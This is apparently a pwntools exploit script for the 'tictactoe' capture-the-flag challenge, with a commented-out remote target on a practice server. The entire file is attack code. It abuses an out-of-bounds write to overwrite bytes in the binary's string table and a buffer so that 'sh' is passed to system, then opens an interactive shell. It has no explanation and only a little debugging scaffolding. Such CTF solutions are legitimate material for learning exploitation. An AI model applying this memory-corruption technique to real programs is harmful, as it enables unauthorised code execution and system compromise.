from pwn import *

p = process('./tictactoe')
#p = remote('hackme.inndy.tw',7714)
elf = ELF('./tictactoe')
#context.log_level = 'debug'
def write(addr,val):
	p.sendlineafter('flavor): ','9')
	p.sendline(val)
	offset = addr - 0x804B056
	p.sendlineafter('flavor): ',str(offset))


p.sendlineafter('(2)nd? ','1')


strtab_addr = 0x0804AF58
sh_addr = 0x0804B048
bss = 0x0804B069
#system - 68 = 0x8049fc8
#sh = '\x73\x68'

gdb.attach(p,'b *' + str(0x08048D03))
raw_input("go : ")
write(0x0804B048,'\x50') #control write 
write(sh_addr,'\x73')
write(strtab_addr,'\xc8')
write(sh_addr+1,'\x68')
write(strtab_addr+1,'\x9f')
write(sh_addr+2,'\x00')

write(bss+0x100,'\x00')
write(sh_addr+3,'\x00')
write(bss+0x100,'\x00')

p.interactive()
